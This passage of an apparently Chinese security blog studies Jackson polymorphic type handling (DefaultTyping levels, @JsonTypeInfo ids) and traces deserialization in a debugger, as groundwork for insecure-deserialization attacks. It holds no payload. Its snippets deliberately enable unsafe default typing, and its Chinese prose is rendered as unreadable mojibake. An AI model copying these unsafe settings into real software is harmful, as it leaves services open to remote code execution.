class="string">&quot;ocean&quot;</span>,zbz1);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®JAVA_LANG_OBJECT</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–ä¹‹åçš„å±æ€§å¸¦æœ‰ç±»åå¹¶ä¸”ç›´æ¥zbzçš„å¯¹è±¡</p><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETEï¼šé™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾ï¼Œå½“ç±»é‡Œæœ‰Interfaceã€AbstractClassç±»æ—¶ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼ˆå½“ç„¶è¿™äº›ç±»æœ¬èº«éœ€è¦æ—¶åˆæ³•çš„ã€å¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼‰ã€‚æ­¤å¤–ï¼Œ<strong>enableDefaultTyping()é»˜è®¤çš„æ— å‚æ•°çš„è®¾ç½®å°±æ˜¯æ­¤é€‰é¡¹ã€‚</strong></p><p>å¼•å…¥ä¸€ä¸ªæ¥å£è¿›è¡Œæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">zbz</span> <span class="variable">zbz1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®JAVA_LANG_OBJECT</span></span><br><span class="line"><span class="comment">//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        String json = objectMapper.writeValueAsString(ocean);</span></span><br><span class="line"><span class="comment">//        System.out.println(json);</span></span><br><span class="line">        <span class="comment">//OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ¥å£åºåˆ—åŒ–æˆåŠŸ</p><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYSï¼šé™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾å¤–ï¼Œè¿˜æ”¯æŒArrayç±»å‹ã€‚</p><p>åœ¨æ”¹é€ ä¸€ä¸‹æ”¹æˆå¸¦æœ‰æ•°ç»„çš„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zbz[] zbz1 = <span class="keyword">new</span> <span class="title class_">zbz</span>[<span class="number">2</span>];</span><br><span class="line">        zbz1[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        zbz1[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//è®¾ç½®NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">è¾“å‡ºï¼š&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;[Lcom.ocean.zbz;&quot;</span>,[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œç±»åå˜æˆäº†â€[Lâ€+ç±»å+â€;â€ï¼Œåºåˆ—åŒ–Objectä¹‹åä¸ºæ•°ç»„å½¢å¼ï¼Œååºåˆ—åŒ–ä¹‹åå¾—åˆ°[Lcom.mi1k7ea.Hacker;ç±»å¯¹è±¡ï¼Œè¯´æ˜å¯¹Arrayç±»å‹æˆåŠŸè¿›è¡Œäº†åºåˆ—åŒ–</p><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINALï¼šé™¤äº†å‰é¢çš„æ‰€æœ‰ç‰¹å¾å¤–ï¼ŒåŒ…å«å³å°†è¢«åºåˆ—åŒ–çš„ç±»é‡Œçš„å…¨éƒ¨ã€éfinalçš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ•´ä¸ªç±»ã€é™¤finalå¤–çš„å±æ€§ä¿¡æ¯éƒ½éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">zbz[] zbz1 = <span class="keyword">new</span> <span class="title class_">zbz</span>[<span class="number">2</span>];</span><br><span class="line">        zbz1[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        zbz1[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>(),<span class="keyword">new</span> <span class="title class_">zbz</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è®¾ç½®NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">è¾“å‡ºï¼š[<span class="string">&quot;com.ocean.Person&quot;</span>,&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;[Lcom.ocean.zbz;&quot;</span>,[[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;],[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]]],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;],<span class="string">&quot;zbz&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸå¯¹éfinalå±æ€§çš„zbzè¿›è¡Œäº†åºåˆ—åŒ–</p><p>ä»å‰é¢çš„åˆ†æçŸ¥é“ï¼ŒDefaultTypingçš„å‡ ä¸ªè®¾ç½®é€‰é¡¹æ˜¯é€æ¸æ‰©å¤§é€‚ç”¨èŒƒå›´çš„ï¼Œå¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th align="left"><strong>DefaultTypingç±»å‹</strong></th><th align="left"><strong>æè¿°è¯´æ˜</strong></th></tr></thead><tbody><tr><td align="left">JAVA_LANG_OBJECT</td><td align="left">å±æ€§çš„ç±»å‹ä¸ºObject</td></tr><tr><td align="left">OBJECT_AND_NON_CONCRETE</td><td align="left">å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClass</td></tr><tr><td align="left">NON_CONCRETE_AND_ARRAYS</td><td align="left">å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClassã€Array</td></tr><tr><td align="left">NON_FINAL</td><td align="left">æ‰€æœ‰é™¤äº†å£°æ˜ä¸ºfinalä¹‹å¤–çš„å±æ€§</td></tr></tbody></table><h3 id="JsonTypeInfoæ³¨è§£"><a href="#JsonTypeInfoæ³¨è§£" class="headerlink" title="@JsonTypeInfoæ³¨è§£"></a>@JsonTypeInfoæ³¨è§£</h3><p>@JsonTypeInfoæ³¨è§£æ˜¯Jacksonå¤šæ€ç±»å‹ç»‘å®šçš„ä¸€ç§æ–¹å¼ï¼Œæ”¯æŒä¸‹é¢5ç§ç±»å‹çš„å–å€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>Personç±»ï¼Œç»™objectå±æ€§æ·»åŠ @JsonTypeInfoæ³¨è§£ï¼ŒæŒ‡å®šä¸ºJsonTypeInfo.Id.NONEï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> address address;</span><br><span class="line">    <span class="keyword">public</span> zbz zbz;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œåºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.object = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//JsonTypeInfo.Id.NONE</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">è¾“å‡ºï¼š&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œå’Œæ²¡æœ‰è®¾ç½®å€¼ä¸ºJsonTypeInfo.Id.NONEçš„@JsonTypeInfoæ³¨è§£æ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>ç»™Personç±»æŒ‡å®šæ³¨è§£ä¸ºJsonTypeInfo.Id.CLASS</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965020177-0c0c1091-33f0-471d-ae7e-6d1a7b5e2031.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@class&quot;</span>:<span class="string">&quot;com.ocean.zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºç§å¤šäº†â€@classâ€:â€com.ocean.zbzâ€ï¼Œå«æœ‰å…·ä½“çš„classä¿¡æ¯</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>ç»™Personç±»æŒ‡å®šJsonTypeInfo.Id.MINIMAL_CLASS<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965117391-0fb27547-c185-47cf-a01e-c3731624f9e9.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@c&quot;</span>:<span class="string">&quot;com.ocean.zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œobjectå±æ€§ä¸­å¤šäº†â€@câ€:â€com.ocean.zbzâ€ï¼Œå³ä½¿ç”¨@cæ›¿ä»£æ–™@classï¼Œå®˜æ–¹æè¿°ä¸­çš„æ„æ€æ˜¯ç¼©çŸ­äº†ç›¸å…³ç±»åï¼Œå®é™…æ•ˆæœå’ŒJsonTypeInfo.Id.CLASSç±»ä¼¼ã€‚</p><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>ç»™Personç±»æŒ‡å®šJsonTypeInfo.Id.NAME</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965225800-f6f708fc-f8a4-460f-b4fc-ebf1e4e2e8d5.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œobjectå±æ€§ä¸­å¤šäº†â€@typeâ€:â€zbzâ€ï¼Œä½†æ²¡æœ‰å…·ä½“çš„åŒ…ååœ¨å†…çš„ç±»åï¼Œå› æ­¤åœ¨åé¢çš„ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè®¾ç½®å€¼æ˜¯ä¸èƒ½è¢«ååºåˆ—åŒ–åˆ©ç”¨çš„ï¼š</p><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>å…¶å®è¿™ä¸ªå€¼æ—¶æä¾›ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„æ„æ€ï¼Œæˆ‘ä»¬æ˜¯æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨çš„ï¼Œéœ€è¦æ‰‹åŠ¨å†™ä¸€ä¸ªè§£æå™¨æ‰èƒ½é…åˆä½¿ç”¨ï¼Œç›´æ¥è¿è¡Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼š</p><p>ç”±å‰é¢æµ‹è¯•å‘ç°ï¼Œå½“@JsonTypeInfoæ³¨è§£è®¾ç½®ä¸ºå¦‚ä¸‹å€¼ä¹‹ä¸€å¹¶ä¸”ä¿®é¥°çš„æ˜¯Objectç±»å‹çš„å±æ€§æ—¶ï¼Œå¯ä»¥åˆ©ç”¨æ¥è§¦å‘Jacksonååºåˆ—åŒ–æ¼æ´ï¼š</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><p>è¿™é‡Œéƒ½æ˜¯å‚è€ƒè‡ª<a href="http://www.mi1k7ea.com/">Mi1k7ea</a>å¸ˆå‚…çš„åªæ˜¯è‡ªå·±é‡æ–°æ•²äº†ä¸€éå¯ä»¥å»çœ‹åŸæ–‡å¾ˆæ˜“æ‡‚</p><h2 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h2><h3 id="DefaultTyping-1"><a href="#DefaultTyping-1" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        person.address = <span class="keyword">new</span> <span class="title class_">addressImpl</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> objectMapper.readValue(<span class="string">&quot;&#123;\&quot;age\&quot;:0,\&quot;name\&quot;:null,\&quot;object\&quot;:null,\&quot;address\&quot;:[\&quot;com.ocean.addressImpl\&quot;,&#123;\&quot;address\&quot;:0&#125;],\&quot;zbz\&quot;:null&#125;&quot;</span>, Person.class);</span><br><span class="line">        System.out.println(person1);</span><br></pre></td></tr></table></figure><p>åœ¨åºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•° å’Œgetteræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966150278-b2f3efdf-9604-4e03-937a-81a9d6f085bb.png"></p><p>åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ æ„é€ å‡½æ•°å’Œsetteræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966188018-7f5b9978-0891-4e28-8514-b031ccd08196.png"></p><h3 id="JsonTypeInfoæ³¨è§£-1"><a href="#JsonTypeInfoæ³¨è§£-1" class="headerlink" title="@JsonTypeInfoæ³¨è§£"></a>@JsonTypeInfoæ³¨è§£</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966272892-a359060f-4fca-491d-89e6-39ae4e7acfbf.png"></p><p>è¾“å‡ºçœ‹åˆ°ï¼Œå’Œä½¿ç”¨DefaultTypingæ˜¯ä¸€æ ·çš„<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966245091-0fa05779-a503-4827-9ab2-7c496f850d92.png"></p><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969016816-3545a39b-daf7-4228-901d-36fd9662d435.png"></p><p>é¦–å…ˆè·Ÿåˆ°_readMapAndCloseæ–¹æ³•ä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969349829-2f2626f1-5b62-44a4-9df8-eaa239d81348.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨deserializeæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969398412-df9846dd-bce0-469e-b9b1-b639e0218f72.png"></p><p>è¿™é‡Œåˆä¼šè°ƒç”¨vanillaDeserializeæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969460707-f79e94ae-5d1d-4264-92a4-468fba91e596.png"></p><p>é¦–å…ˆä¼šè°ƒç”¨createUsingDefaultæ–¹æ³•åˆ›å»ºå¯¹è±¡å®ä¾‹å¯ä»¥è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969493721-e376201b-c750-4792-8815-42a7e5e8cd7e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969595789-33f63c64-f232-4529-adaf-55837d1a0c8d.png"></p><p>å¯ä»¥çœ‹åˆ°å­˜ç€personå¯¹è±¡è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969623411-af31bd03-f397-488d-a8c2-ea0f521d90b3.png"></p><p>è¿›è¡Œå®ä¾‹åŒ–è°ƒç”¨personçš„æ„é€ æ–¹æ³•ã€‚åœ¨è¿™ä¹‹åä¼šè¿›å…¥do - whileå¾ªç¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969763454-16620106-f349-4cf2-bf07-b3108ec2ff22.png"></p><p>å¾ªç¯é‡Œä¼šè°ƒç”¨deserializeAndSet()å‡½æ•°æ¥è§£æå¹¶è®¾ç½®Beançš„å±æ€§å€¼è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735012872772-3bded198-77a6-4f1c-85c5-b1e6a85354f0.png"></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªååºåˆ—åŒ–å‡½æ•°å¦‚æœååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­å¸¦æœ‰classåˆ™ä¼šè¿›å…¥deserializeWithTypeæ–¹æ³•å¦åˆ™ä¼šè¿›å…¥deserializeæ–¹æ³•ã€‚è¿™é‡Œç”±äºç¬¬ä¸€ä¸ªå±æ€§æ—¶ageå±æ€§æ‰€ä»¥ä¼šç›´æ¥è¿›å…¥deserializeæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013921590-2c52542a-37c9-4d5d-bd76-4de7bbe5963f.png"></p><p>è¿™é‡Œä¼šå»è·å–ageçš„å±æ€§å€¼ç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735014009481-3ee9f43a-e7fb-4851-900b-ac12f076057d.png"></p><p>ç„¶åä¼šåå°„è°ƒç”¨ä»–çš„setteræ–¹æ³•</p><p>ä¸‹é¢æˆ‘ä»¬åœ¨æ¥çœ‹çœ‹è¿›å…¥deserializeWithTypeæ–¹æ³•æ˜¯å•¥æ ·çš„æˆ‘ä»¬å·²ç»è·å–åˆ°addresså±æ€§æ‰€ä»¥ä¼šè¿›å…¥deserializeWithTypeæ–¹æ³•</p><p><img 